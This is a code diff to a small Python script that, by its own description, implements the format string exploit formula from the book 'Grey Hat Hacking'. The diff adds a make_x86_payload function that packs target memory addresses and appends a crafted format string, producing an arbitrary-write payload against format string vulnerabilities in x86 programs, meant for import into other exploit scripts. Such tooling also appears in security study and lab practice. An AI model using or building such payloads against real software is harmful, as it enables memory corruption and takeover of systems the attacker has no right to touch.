@@ -1,6 +1,7 @@
 """This is just a super quick implementation of the string format formula described in
 Grey Hat Hacking, The Ethical Hacker's Handbook """
 import argparse
+import struct
 
 
 def main(args):
@@ -54,6 +55,16 @@ def create_format_string(value_to_write, offset=1):
             offset)
 
     return shell_string
+
+
+def make_x86_payload(address_to_write_to, value_to_write, offset=1):
+    """I really just want something that I can import into another script;
+    this is that"""
+    payload = struct.pack('<I', address_to_write_to)
+    if value_to_write > 0xffff:
+        payload += struct.pack('<I', address_to_write_to + 2)
+    payload += create_format_string(value_to_write, offset).encode()
+    return payload
 
 
 if __name__ == "__main__":
